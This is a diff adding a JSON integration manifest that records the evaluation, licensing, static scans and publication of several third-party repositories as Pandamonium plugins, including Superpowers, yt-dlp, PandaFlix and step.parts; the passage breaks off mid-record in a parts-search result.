@@ -1,0 +1,1664 @@
+{
+  "issue": "MAD-963",
+  "schema_version": 1,
+  "validation_platform": "Linux amd64",
+  "application_compatibility_floor": "1.0.68 (source validation override only; release is MAD-965)",
+  "personal_account_installs": 0,
+  "default_skill_inclusion": "No change; conditional on evaluation and licensed package admission.",
+  "held_out_numbers": [
+    9,
+    10,
+    29
+  ],
+  "generation_limit": "Reviewed source-grounded proposals exercised real scanner/install/dispatch; this is not proof of autonomous live-model generation. MAD-964 owns held-out acceptance.",
+  "entries": [
+    {
+      "number": 1,
+      "name": "Ponytail",
+      "requested_source": "https://github.com/dietrichgebert/ponytail",
+      "target": "Native skill bundle",
+      "resolved_source": "https://github.com/DietrichGebert/ponytail",
+      "source_revision": "e3ba2aa6f1e6f0bc4d69eb09c9f0d0a93af56156",
+      "packages": [
+        {
+          "extension_id": "ponytail",
+          "recipe": null,
+          "source_revision": "e3ba2aa6f1e6f0bc4d69eb09c9f0d0a93af56156",
+          "prepared_sha256": "5f61d19d005bf02f81eb07d02250913377b01c8232ee1f947452ea3de63e4b3e",
+          "prepared_version": "0.0.0-draft",
+          "operations": [
+            {
+              "skill": "ponytail",
+              "native_body_chars": 6668
+            },
+            {
+              "skill": "ponytail-audit",
+              "native_body_chars": 1821
+            },
+            {
+              "skill": "ponytail-debt",
+              "native_body_chars": 1885
+            },
+            {
+              "skill": "ponytail-gain",
+              "native_body_chars": 1985
+            },
+            {
+              "skill": "ponytail-help",
+              "native_body_chars": 2917
+            },
+            {
+              "skill": "ponytail-review",
+              "native_body_chars": 2527
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "native descriptor",
+          "publication": {
+            "state": "published",
+            "digest": "4866a6f578b2bca53e6d7827123ff9fb8fb223148ff6b788f54afb1121a5cb27",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-ponytail-1.0.0-4866a6f578b2bca53e6d7827123ff9fb8fb223148ff6b788f54afb1121a5cb27/pandamonium-plugin-ponytail-4866a6f578b2bca53e6d7827123ff9fb8fb223148ff6b788f54afb1121a5cb27.tar.gz",
+            "validation": {
+              "kind": "native_skills",
+              "count": 6
+            },
+            "origin": "MAD-962; immutable public artifact preserved"
+          }
+        }
+      ],
+      "coverage": "Native admission and body retrieval of all six Ponytail skills.",
+      "outstanding": "Instructions only; commands inside skills keep normal host requirements and authorization.",
+      "license": "MIT",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 2,
+      "name": "Superpowers",
+      "requested_source": "https://github.com/obra/superpowers",
+      "target": "Native skill bundle",
+      "resolved_source": "https://github.com/obra/superpowers",
+      "source_revision": "b36e0829c6d0140e93cfef2ca599b1b07d4a7797",
+      "packages": [
+        {
+          "extension_id": "superpowers",
+          "recipe": "integrations/repository-packages/superpowers/proposal.json",
+          "source_revision": "b36e0829c6d0140e93cfef2ca599b1b07d4a7797",
+          "prepared_sha256": "ecb76cae4cdcbc09d51327052fb01993b8b7a03dbd0c57ac4d17ea6b832bfc44",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "skill": "brainstorming",
+              "native_body_chars": 15393
+            },
+            {
+              "skill": "dispatching-parallel-agents",
+              "native_body_chars": 6092
+            },
+            {
+              "skill": "executing-plans",
+              "native_body_chars": 2415
+            },
+            {
+              "skill": "finishing-a-development-branch",
+              "native_body_chars": 7714
+            },
+            {
+              "skill": "receiving-code-review",
+              "native_body_chars": 6035
+            },
+            {
+              "skill": "requesting-code-review",
+              "native_body_chars": 3073
+            },
+            {
+              "skill": "subagent-driven-development",
+              "native_body_chars": 32198
+            },
+            {
+              "skill": "systematic-debugging",
+              "native_body_chars": 9402
+            },
+            {
+              "skill": "test-driven-development",
+              "native_body_chars": 8984
+            },
+            {
+              "skill": "using-git-worktrees",
+              "native_body_chars": 6825
+            },
+            {
+              "skill": "using-superpowers",
+              "native_body_chars": 3225
+            },
+            {
+              "skill": "verification-before-completion",
+              "native_body_chars": 3660
+            },
+            {
+              "skill": "writing-plans",
+              "native_body_chars": 7025
+            },
+            {
+              "skill": "writing-skills",
+              "native_body_chars": 25705
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "ecb76cae4cdcbc09d51327052fb01993b8b7a03dbd0c57ac4d17ea6b832bfc44",
+            "digest": "ecb76cae4cdcbc09d51327052fb01993b8b7a03dbd0c57ac4d17ea6b832bfc44",
+            "extension_id": "superpowers",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-superpowers-1.0.0-ecb76cae4cdcbc09d51327052fb01993b8b7a03dbd0c57ac4d17ea6b832bfc44/pandamonium-plugin-superpowers-ecb76cae4cdcbc09d51327052fb01993b8b7a03dbd0c57ac4d17ea6b832bfc44.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:07:02.838869+00:00",
+            "validation": {
+              "kind": "native_skills",
+              "count": 14
+            }
+          }
+        }
+      ],
+      "coverage": "Native admission and body retrieval of all fourteen Superpowers skills, including CJS, shell and DOT references.",
+      "outstanding": "Instructions only; optional credential-shaped brainstorm-server test fixtures excluded.",
+      "license": "MIT",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 3,
+      "name": "agentic-awesome-skills",
+      "requested_source": "https://github.com/sickn33/agentic-awesome-skills",
+      "target": "Evaluate/admit useful skills; approved default inclusion must use the same validated package path",
+      "resolved_source": "https://github.com/sickn33/agentic-awesome-skills",
+      "source_revision": "69906dde999aaa0f3d173f0e3d5bcdb84c87a294",
+      "packages": [],
+      "coverage": "Evaluated systematic-debugging, test-driven-development, verification-before-completion and api-design-principles against their real bodies and references. The first three duplicate Superpowers; api-design-principles is a useful candidate. No default enablement.",
+      "outstanding": "Outstanding: review selected-skill attribution and third-party exceptions, unsupported metadata/assets and credential-shaped examples. The 23,096-file mixed corpus has no installable draft; do not relicense it wholesale as MIT or treat evaluation as admission.",
+      "license": "MIT code; CC-BY-4.0 original content; third-party exceptions",
+      "status": "outstanding",
+      "static_scan": {
+        "repo_class": "python_cli",
+        "licenses": [
+          "MIT",
+          "Apache-2.0"
+        ],
+        "error": null,
+        "has_installable_draft": false,
+        "finding_categories": [
+          "dangerous_pattern",
+          "oversized_blob",
+          "secret"
+        ]
+      }
+    },
+    {
+      "number": 4,
+      "name": "Chatterbox",
+      "requested_source": "https://github.com/resemble-ai/chatterbox",
+      "target": "Speech runtime; deployment-node wizard automatically connects voice configuration, editable in Settings",
+      "resolved_source": "https://github.com/resemble-ai/chatterbox",
+      "source_revision": "5de7a54aa4e5e2baadb0182dde554908b48b85c2",
+      "packages": [],
+      "coverage": "Existing Chatterbox external-runtime recipe and node/voice setup contract reviewed against pinned upstream.",
+      "outstanding": "Needs setup: choose a disposable model-serving node, model weights and supported accelerator; run real speech inference. Prior fixture transport is not synthesis proof; preserve editable voice configuration.",
+      "license": "MIT",
+      "status": "outstanding",
+      "static_scan": {
+        "repo_class": "python_cli",
+        "licenses": [
+          "MIT"
+        ],
+        "error": null,
+        "has_installable_draft": false,
+        "finding_categories": []
+      }
+    },
+    {
+      "number": 5,
+      "name": "myinstants-api",
+      "requested_source": "https://github.com/MADPANDA3D/myinstants-api",
+      "target": "Audio/API integration",
+      "resolved_source": "https://github.com/MADPANDA3D/myinstants-api",
+      "source_revision": "435d40d309ab2790e21567b00c9727509badeedd",
+      "packages": [
+        {
+          "extension_id": "myinstants-api",
+          "recipe": "integrations/repository-packages/myinstants-api/proposal.json",
+          "source_revision": "435d40d309ab2790e21567b00c9727509badeedd",
+          "prepared_sha256": "6c1d52c667a985eeed71627b3dbe37e98bc4cbf66cc345e4e3e341044d0ce2d9",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "myinstants_api__recent",
+              "arguments": {},
+              "result": {
+                "sounds": [
+                  {
+                    "id": "matts-a-clown-24313",
+                    "title": "Matts a Clown",
+                    "url": "https://www.myinstants.com/en/instant/matts-a-clown-24313/",
+                    "mp3": "https://www.myinstants.com/media/sounds/matts-a-clown.mp3"
+                  },
+                  {
+                    "id": "gah-dayum-slowed-49608",
+                    "title": "Gah Dayum Slowed",
+                    "url": "https://www.myinstants.com/en/instant/gah-dayum-slowed-49608/",
+                    "mp3": "https://www.myinstants.com/media/sounds/gah-dayum-slowed.mp3"
+                  },
+                  {
+                    "id": "beleza-pia-veio-conversamo-44948",
+                    "title": "Beleza pia veio conversamo",
+                    "url": "https://www.myinstants.com/en/instant/beleza-pia-veio-conversamo-44948/",
+                    "mp3": "https://www.myinstants.com/media/sounds/beleza-pia-veio-conversamo.mp3"
+                  },
+                  {
+                    "id": "do-not-download-twitter-18740",
+                    "title": "Do not download twitter",
+                    "url": "https://www.myinstants.com/en/instant/do-not-download-twitter-18740/",
+                    "mp3": "https://www.myinstants.com/media/sounds/do-not-download-twitter.mp3"
+                  },
+                  {
+                    "id": "chupenpico-55035",
+                    "title": "Chupenpico",
+                    "url": "https://www.myinstants.com/en/instant/chupenpico-55035/",
+                    "mp3": "https://www.myinstants.com/media/sounds/chupenpico.mp3"
+                  },
+                  {
+                    "id": "trabajar-4909",
+                    "title": "Trabajar",
+                    "url": "https://www.myinstants.com/en/instant/trabajar-4909/",
+                    "mp3": "https://www.myinstants.com/media/sounds/trabajar.mp3"
+                  },
+                  {
+                    "id": "edit-song-verity-83769",
+                    "title": "Edit song Verity",
+                    "url": "https://www.myinstants.com/en/instant/edit-song-verity-83769/",
+                    "mp3": "https://www.myinstants.com/media/sounds/edit-song-verity.mp3"
+                  },
+                  {
+                    "id": "we-are-in-the-future-su-86266",
+                    "title": "We Are In the Future SU",
+                    "url": "https://www.myinstants.com/en/instant/we-are-in-the-future-su-86266/",
+                    "mp3": "https://www.myinstants.com/media/sounds/we-are-in-the-future-su.mp3"
+                  },
+                  {
+                    "id": "i-cant-do-nathan-64983",
+                    "title": "I can&#x27;t do Nathan",
+                    "url": "https://www.myinstants.com/en/instant/i-cant-do-nathan-64983/",
+                    "mp3": "https://www.myinstants.com/media/sounds/i-cant-do-nathan_LvyyD6y.mp3"
+                  },
+                  {
+                    "id": "musica-do-gol-do-brasil-2014-67701",
+                    "title": "M\u00daSICA DO GOL DO BRASIL 2014",
+                    "url": "https://www.myinstants.com/en/instant/musica-do-gol-do-brasil-2014-67701/",
+                    "mp3": "https://www.myinstants.com/media/sounds/musica-do-gol-do-brasil-2014.mp3"
+                  }
+                ]
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "6c1d52c667a985eeed71627b3dbe37e98bc4cbf66cc345e4e3e341044d0ce2d9",
+            "digest": "6c1d52c667a985eeed71627b3dbe37e98bc4cbf66cc345e4e3e341044d0ce2d9",
+            "extension_id": "myinstants-api",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-myinstants-api-1.0.0-6c1d52c667a985eeed71627b3dbe37e98bc4cbf66cc345e4e3e341044d0ce2d9/pandamonium-plugin-myinstants-api-6c1d52c667a985eeed71627b3dbe37e98bc4cbf66cc345e4e3e341044d0ce2d9.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:07:20.065902+00:00",
+            "validation": {
+              "kind": "isolated_operations",
+              "checks": 1
+            }
+          }
+        }
+      ],
+      "coverage": "Real recent-sound API response through the mounted native tool, ten sound records with source/audio URLs.",
+      "outstanding": "Requires live Myinstants access; sound content retains its own rights.",
+      "license": "MIT",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 6,
+      "name": "yt-dlp",
+      "requested_source": "https://github.com/yt-dlp/yt-dlp",
+      "target": "CLI tooling and resulting artifacts",
+      "resolved_source": "https://github.com/yt-dlp/yt-dlp",
+      "source_revision": "bbc809a1161d3bfca51fa36f59dda35556ee85a0",
+      "packages": [
+        {
+          "extension_id": "yt-dlp",
+          "recipe": "integrations/repository-packages/yt-dlp/proposal.json",
+          "source_revision": "bbc809a1161d3bfca51fa36f59dda35556ee85a0",
+          "prepared_sha256": "c318a7cc68fa270e9d5333c12e5c0bd6b9f25236c4f500598cae67e0ef6a4851",
+          "prepared_version": "0.1.0",
+          "operations": [
+            {
+              "tool": "yt_dlp__inspect_media",
+              "arguments": {
+                "url": "file:///runtime/check.wav"
+              },
+              "result": {
+                "id": "check",
+                "title": "check",
+                "extension": "wav"
+              }
+            },
+            {
+              "tool": "yt_dlp__download_media",
+              "arguments": {
+                "url": "file:///runtime/check.wav"
+              },
+              "result": {
+                "id": "check",
+                "title": "check",
+                "extension": "wav",
+                "artifact": "artifacts/check.wav",
+                "bytes": 1644
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "c318a7cc68fa270e9d5333c12e5c0bd6b9f25236c4f500598cae67e0ef6a4851",
+            "digest": "0facb77d950a43ec96c2d883468b792c097fcc071482ed8a39a41d354f193c13",
+            "extension_id": "yt-dlp",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-yt-dlp-1.0.0-0facb77d950a43ec96c2d883468b792c097fcc071482ed8a39a41d354f193c13/pandamonium-plugin-yt-dlp-0facb77d950a43ec96c2d883468b792c097fcc071482ed8a39a41d354f193c13.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:12:59.062794+00:00",
+            "validation": {
+              "kind": "isolated_operations",
+              "checks": 2
+            }
+          }
+        }
+      ],
+      "coverage": "Inspect and download a real bounded direct-media WAV through native tools; artifact size 1,644 bytes.",
+      "outstanding": "This package supports the declared direct-media workflow; optional provider extractors are excluded, and all-site compatibility is not claimed. Two unused private-key certificate fixtures were excluded after full publication audit.",
+      "license": "Unlicense",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 7,
+      "name": "open-gif-api",
+      "requested_source": "https://github.com/bryanstedman/open-gif-api",
+      "target": "GIF/API integration",
+      "resolved_source": "https://github.com/bryanstedman/open-gif-api",
+      "source_revision": "d78c919c5174a6971f72590a393f9dcaaf274ca8",
+      "packages": [],
+      "coverage": "Pinned Node/Express source; README documents /all and /tag/<tag>. Static scan completed.",
+      "outstanding": "Outstanding: no top-level upstream license. Vendored node_modules licenses do not license this API project. Resolve redistribution rights and a working service endpoint before packaging/publication.",
+      "license": "No upstream project license found",
+      "status": "outstanding",
+      "static_scan": {
+        "repo_class": "node_cli",
+        "licenses": [
+          "MIT",
+          "BSD-3-Clause",
+          "Apache-2.0"
+        ],
+        "error": null,
+        "has_installable_draft": false,
+        "finding_categories": []
+      }
+    },
+    {
+      "number": 8,
+      "name": "OtakuGIFs",
+      "requested_source": "https://otakugifs.xyz/",
+      "target": "Website/API pointer; resolve actual integration source, do not pretend it is a Git repository",
+      "resolved_source": "https://api.otakugifs.xyz",
+      "source_revision": null,
+      "packages": [],
+      "coverage": "Resolved official website documentation to api.otakugifs.xyz; real HTTP 200 allreactions and kiss GIF calls.",
+      "outstanding": "Outstanding: the website is not a Git repository. No official distributable backend/source license found. A third-party wrapper is not the official source; select an attributed licensed API adapter before package publication.",
+      "license": "API service; package source unresolved",
+      "status": "outstanding",
+      "api_evidence": [
+        {
+          "url": "https://api.otakugifs.xyz/gif/allreactions",
+          "http_status": 200,
+          "response": {
+            "reactions": [
+              "airkiss",
+              "angrystare",
+              "bite",
+              "bleh",
+              "blush",
+              "brofist",
+              "celebrate",
+              "cheers",
+              "clap",
+              "confused",
+              "cool",
+              "cry",
+              "cuddle",
+              "dance",
+              "drool",
+              "evillaugh",
+              "facepalm",
+              "handhold",
+              "happy",
+              "headbang",
+              "hug",
+              "huh",
+              "kiss",
+              "laugh",
+              "lick",
+              "love",
+              "mad",
+              "nervous",
+              "no",
+              "nom",
+              "nosebleed",
+              "nuzzle",
+              "nyah",
+              "pat",
+              "peek",
+              "pinch",
+              "poke",
+              "pout",
+              "punch",
+              "roll",
+              "run",
+              "sad",
+              "scared",
+              "shout",
+              "shrug",
+              "shy",
+              "sigh",
+              "sing",
+              "sip",
+              "slap",
+              "sleep",
+              "slowclap",
+              "smack",
+              "smile",
+              "smug",
+              "sneeze",
+              "sorry",
+              "stare",
+              "stop",
+              "surprised",
+              "sweat",
+              "thumbsup",
+              "tickle",
+              "tired",
+              "wave",
+              "wink",
+              "woah",
+              "yawn",
+              "yay",
+              "yes"
+            ]
+          }
+        },
+        {
+          "url": "https://api.otakugifs.xyz/gif?reaction=kiss&format=gif",
+          "http_status": 200,
+          "response": {
+            "url": "https://cdn.otakugifs.xyz/gifs/kiss/1ddfcffef8148cca.gif"
+          }
+        }
+      ]
+    },
+    {
+      "number": 9,
+      "name": "gifukai-api",
+      "requested_source": "https://github.com/lucialv/gifukai-api",
+      "target": "Held-out API/service URL",
+      "resolved_source": null,
+      "source_revision": null,
+      "packages": [],
+      "status": "held_out_MAD-964",
+      "coverage": "Intentionally not fetched, adapted, installed or published by this task.",
+      "outstanding": "MAD-964 must evaluate the fresh URL without repository-specific core support.",
+      "license": null
+    },
+    {
+      "number": 10,
+      "name": "ani-cli",
+      "requested_source": "https://github.com/pystardust/ani-cli",
+      "target": "Held-out shell/interactive CLI URL",
+      "resolved_source": null,
+      "source_revision": null,
+      "packages": [],
+      "status": "held_out_MAD-964",
+      "coverage": "Intentionally not fetched, adapted, installed or published by this task.",
+      "outstanding": "MAD-964 must evaluate the fresh URL without repository-specific core support.",
+      "license": null
+    },
+    {
+      "number": 11,
+      "name": "PandaFlix",
+      "requested_source": "https://github.com/MADPANDA3D/pandaflix",
+      "target": "Go CLI capabilities and interactive prerequisites",
+      "resolved_source": "https://github.com/MADPANDA3D/pandaflix",
+      "source_revision": "f6484787ba5a23d4453d5bbd8eb34f05054ecfbb",
+      "packages": [
+        {
+          "extension_id": "pandaflix",
+          "recipe": "integrations/repository-packages/pandaflix/proposal.json",
+          "source_revision": "f6484787ba5a23d4453d5bbd8eb34f05054ecfbb",
+          "prepared_sha256": "b361e9ddb7883316f98565616e337bfff0e99fcfd59bfef92bab9b24cc9d3143",
+          "prepared_version": "0.1.0",
+          "operations": [
+            {
+              "tool": "pandaflix__episode_range",
+              "arguments": {
+                "s": "2-4"
+              },
+              "result": {
+                "episodes": [
+                  2,
+                  3,
+                  4
+                ]
+              }
+            },
+            {
+              "tool": "pandaflix__youtube_playback_plan",
+              "arguments": {
+                "urlStr": "https://youtu.be/BaW_jenozKc"
+              },
+              "result": {
+                "media_id": "BaW_jenozKc",
+                "playback_url": "https://www.youtube.com/watch?v=BaW_jenozKc",
+                "requires_player": true
+              }
+            },
+            {
+              "tool": "pandaflix__watch_history",
+              "arguments": {},
+              "result": {
+                "shows": []
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "b361e9ddb7883316f98565616e337bfff0e99fcfd59bfef92bab9b24cc9d3143",
+            "digest": "664834d2b9cacdf4e64321247de212ae9544906529de4dd542fc3a78b7e17405",
+            "extension_id": "pandaflix",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-pandaflix-1.0.0-664834d2b9cacdf4e64321247de212ae9544906529de4dd542fc3a78b7e17405/pandamonium-plugin-pandaflix-664834d2b9cacdf4e64321247de212ae9544906529de4dd542fc3a78b7e17405.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:09:50.628355+00:00",
+            "validation": {
+              "kind": "isolated_operations",
+              "checks": 3
+            }
+          }
+        }
+      ],
+      "coverage": "Real Go compilation plus episode-range expansion, playback planning and isolated empty watch history through three native tools.",
+      "outstanding": "Interactive playback needs a configured player/display and provider access; not claimed by the verified planning operations.",
+      "license": "GPL-3.0 with retained third-party notices",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 12,
+      "name": "img2threejs",
+      "requested_source": "https://github.com/img2threejs/img2threejs",
+      "target": "Image/3D integration",
+      "resolved_source": "https://github.com/img2threejs/img2threejs",
+      "source_revision": "6e60b5e22419464b4853e01ddb6c0e6f6659a733",
+      "packages": [
+        {
+          "extension_id": "img2threejs",
+          "recipe": "integrations/repository-packages/img2threejs/proposal.json",
+          "source_revision": "6e60b5e22419464b4853e01ddb6c0e6f6659a733",
+          "prepared_sha256": "278d9ecd9f8e867068828bd232e5e131ec14d320ad10d0bce6b2ccf79fad52d8",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "img2threejs__create_spec",
+              "arguments": {
+                "target_name": "Test cube"
+              },
+              "result": {
+                "artifact": "/runtime/artifacts/sculpt-spec.json",
+                "target_name": "Test cube",
+                "bytes": 36119
+              }
+            },
+            {
+              "tool": "img2threejs__validate_spec",
+              "arguments": {
+                "spec": "/package/forge/tests/fixtures/reference_target_conformance_spec.json"
+              },
+              "result": {
+                "valid": true,
+                "errors": [],
+                "warnings": [
+                  "suitability is pass but risks are present; confirm they are acceptable"
+                ]
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "278d9ecd9f8e867068828bd232e5e131ec14d320ad10d0bce6b2ccf79fad52d8",
+            "digest": "278d9ecd9f8e867068828bd232e5e131ec14d320ad10d0bce6b2ccf79fad52d8",
+            "extension_id": "img2threejs",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-img2threejs-1.0.0-278d9ecd9f8e867068828bd232e5e131ec14d320ad10d0bce6b2ccf79fad52d8/pandamonium-plugin-img2threejs-278d9ecd9f8e867068828bd232e5e131ec14d320ad10d0bce6b2ccf79fad52d8.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:10:05.754591+00:00",
+            "validation": {
+              "kind": "isolated_operations",
+              "checks": 2
+            }
+          }
+        }
+      ],
+      "coverage": "Real upstream sculpt-spec creation and validation through two native tools, retaining a JSON artifact.",
+      "outstanding": "Partial requested capability: scaffold creation is not image interpretation, mesh generation or rendered reconstruction. Full native root skill exceeds the 64-file asset ceiling; downstream image/Three.js workflow remains outstanding.",
+      "license": "Apache-2.0",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 13,
+      "name": "Barehands",
+      "requested_source": "https://github.com/jaredrhod/barehands",
+      "target": "3D/CAD integration",
+      "resolved_source": "https://github.com/jaredrhod/barehands",
+      "source_revision": "eb23bed2d772f9d5a24de26fb92f46c3c76d69cf",
+      "packages": [
+        {
+          "extension_id": "barehands",
+          "recipe": "integrations/repository-packages/barehands/proposal.json",
+          "source_revision": "eb23bed2d772f9d5a24de26fb92f46c3c76d69cf",
+          "prepared_sha256": "2b10a9849ceeca75e20cb2f6f534db23aa2e7cb466a1393e359a6e0a214e2fc4",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "barehands__board_state",
+              "arguments": {},
+              "result": {
+                "connected": false,
+                "state_json": "{}"
+              }
+            },
+            {
+              "tool": "barehands__configuration",
+              "arguments": {},
+              "result": {
+                "configuration_json": "{\"name\": \"Pandamonium board\", \"orbs\": [{\"title\": \"Notes\", \"kind\": \"notes\"}, {\"title\": \"Props\", \"kind\": \"media\"}]}"
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "2b10a9849ceeca75e20cb2f6f534db23aa2e7cb466a1393e359a6e0a214e2fc4",
+            "digest": "2b10a9849ceeca75e20cb2f6f534db23aa2e7cb466a1393e359a6e0a214e2fc4",
+            "extension_id": "barehands",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-barehands-1.0.0-2b10a9849ceeca75e20cb2f6f534db23aa2e7cb466a1393e359a6e0a214e2fc4/pandamonium-plugin-barehands-2b10a9849ceeca75e20cb2f6f534db23aa2e7cb466a1393e359a6e0a214e2fc4.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:10:29.298540+00:00",
+            "validation": {
+              "kind": "isolated_operations",
+              "checks": 2
+            }
+          }
+        }
+      ],
+      "coverage": "Real private Barehands server starts; native tools read /state and /config; lifecycle stops and removes it.",
+      "outstanding": "Source correction: Barehands is a webcam-controlled board, not a CAD generator. Interactive gesture proof requires Chrome and a webcam; no camera access was used.",
+      "license": "AGPL-3.0",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 14,
+      "name": "blender-agent-tools",
+      "requested_source": "https://github.com/elasticdotventures/blender-agent-tools",
+      "target": "Blender agent integration and required host setup",
+      "resolved_source": "https://github.com/elasticdotventures/blender-agent-tools",
+      "source_revision": "7ace50a94f282b0bbfbe9eae2eb6e621ea012743",
+      "packages": [],
+      "coverage": "Inspected the tutorial/meta-repository and referenced Blender agent host stack. Static scan completed.",
+      "outstanding": "Outstanding: no project license and no self-contained Blender add-on at this source. Resolve the actual add-on source/version and a disposable Blender host before packaging.",
+      "license": "No upstream project license found",
+      "status": "outstanding",
+      "static_scan": {
+        "repo_class": "service",
+        "licenses": [],
+        "error": null,
+        "has_installable_draft": false,
+        "finding_categories": [
+          "dangerous_pattern",
+          "license"
+        ]
+      }
+    },
+    {
+      "number": 15,
+      "name": "step.parts",
+      "requested_source": "https://github.com/earthtojake/step.parts",
+      "target": "CAD/parts integration",
+      "resolved_source": "https://github.com/earthtojake/step.parts",
+      "source_revision": "c6113328a5695b976a010a203a90fe86191769bf",
+      "packages": [
+        {
+          "extension_id": "step-parts",
+          "recipe": "integrations/repository-packages/step-parts/proposal.json",
+          "source_revision": "c6113328a5695b976a010a203a90fe86191769bf",
+          "prepared_sha256": "57f75d29fb3c1783234a4f6c11a26d1dca9491eceb8d501bbed682e726f14792",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "step_parts__search",
+              "arguments": {
+                "q": "M3"
+              },
+              "result": {
+                "total": 428,
+                "items_json": "[{\"id\": \"din913_set_screw_m3x3\", \"name\": \"DIN 913 set screw, M3 x 3\", \"description\": \"DIN 913, set screw, M3 x 3.\", \"category\": \"fastener\", \"family\": \"set-screw\", \"tags\": [\"screw\", \"metric\"], \"aliases\": [\"M3 set screw\", \"DIN 913 M3x3\", \"DIN913 M3x3\"], \"standard\": {\"body\": \"DIN\", \"number\": \"913\", \"designation\": \"DIN 913\"}, \"attributes\": {\"thread\": \"M3\", \"lengthMm\": 3, \"nominalSize\": \"M3 x 3\", \"driveStyle\": \"hex-socket\"}, \"stepUrl\": \"https://media.githubusercontent.com/media/earthtojake/step.parts/c6113328a5695b976a010a203a90fe86191769bf/catalog/step/din913_set_screw_m3x3.step\", \"glbUrl\": \"https://8ljrorjug0ps5al0.public.blob.vercel-storage.com/preview/glb/din913_set_screw_m3x3-527708f07fb56cd0d4a49def35f1d6d12695f3ebbb75ba226e8546921833bac2.glb\", \"pngUrl\": \"https://8ljrorjug0ps5al0.public.blob.vercel-storage.com/preview/png/din913_set_screw_m3x3-527708f07fb56cd0d4a49def35f1d6d12695f3ebbb75ba226e8546921833bac2.png\", \"byteSize\": 31410, \"sha256\": \"527708f07fb56cd0d4a49def35f1d6d12695f3ebbb75ba226e8546921833bac2\", \"pageUrl\": \"https://www.step.parts/parts/din913_set_screw_m3x3\", \"apiUrl\": \"https://api.step.parts/v1/parts/din913_set_screw_m3x3\"}, {\"id\": \"din913_set_screw_m3x4\", \"name\": \"DIN 913 set screw, M3 x 4\", \"description\": \"DIN 913, set screw, M3 x 4.\", \"category\": \"fastener\", \"family\": \"set-screw\", \"tags\": [\"screw\", \"metric\"], \"aliases\": [\"M3 set screw\", \"DIN 913 M3x4\", \"DIN913 M3x4\"], \"standard\": {\"body\": \"DIN\", \"number\": \"913\", \"designation\": \"DIN 913\"}, \"attributes\": {\"thread\": \"M3\", \"lengthMm\": 4, \"nominalSize\": \"M3 x 4\", \"driveStyle\": \"hex-socket\"}, \"stepUrl\": \"https://media.githubusercontent.com/media/earthtojake/step.parts/c6113328a5695b976a010a203a90fe86191769bf/catalog/step/din913_set_screw_m3x4.step\", \"glbUrl\": \"https://8ljrorjug0ps5al0.public.blob.vercel-storage.com/preview/glb/din913_set_screw_m3x4-b3a42752246bb0c0c196ec442b39aeb8e45565b8fad17ea5eaaf87edcfaf812b.glb\", \"pngUrl\": \"https://8ljrorjug0ps5al0.public.blob.vercel-storage.com/preview/png/din913_set_screw_m3x4-b3a42752246bb0c0c196ec442b39aeb8e45565b8fad17ea5eaaf87edcfaf812b.png\", \"byteSize\": 31444, \"sha256\": \"b3a42752246bb0c0c196ec442b39aeb8e45565b8fad17ea5eaaf87edcfaf812b\", \"pageUrl\": \"https://www.step.parts/parts/din913_set_screw_m3x4\", \"apiUrl\": \"https://api.step.parts/v1/parts/din913_set_screw_m3x4\"}, {\"id\": \"din913_set_screw_m3x5\", \"name\": \"DIN 913 set screw, M3 x 5\", \"description\": \"DIN 913, set screw, M3 x 5.\", \"category\": \"fastener\", \"family\": \"set-screw\", \"tags\": [\"screw\", \"metric\"], 